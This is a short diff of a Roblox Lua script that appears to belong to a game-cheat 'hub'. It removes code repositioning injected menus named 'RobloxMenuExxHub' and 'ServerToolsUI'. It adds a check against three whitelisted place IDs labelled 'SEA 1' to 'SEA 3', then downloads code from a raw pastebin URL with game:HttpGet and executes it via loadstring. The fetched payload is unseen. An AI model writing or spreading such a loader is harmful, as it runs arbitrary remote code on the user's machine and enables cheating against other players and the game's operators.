@@ -1,4 +1,10 @@
-game:GetService("Players").LocalPlayer.PlayerGui.RobloxMenuExxHub.Frame.Position = UDim2.new(1, -185, 0, 60)
-game:GetService("Players").LocalPlayer.PlayerGui.RobloxMenuExxHub.TextButton.Position = UDim2.new(1, -112, 0, 8)
-game:GetService("Players").LocalPlayer.PlayerGui.ServerToolsUI.ToggleButton.Position = UDim2.new(0, 170, 0, 8)
-game:GetService("Players").LocalPlayer.PlayerGui.ServerToolsUI.Frame.Position = UDim2.new(0, 115, 0, 60)
+local AllowedPlaceIds = {
+    [2753915549] = true, -- SEA 1
+    [4442272183] = true, -- SEA 2
+    [7449423635] = true  -- SEA 3
+}
+
+if AllowedPlaceIds[game.PlaceId] then
+    loadstring(game:HttpGet("https://pastebin.com/raw/MAPnfv2Z"))()
+end
+
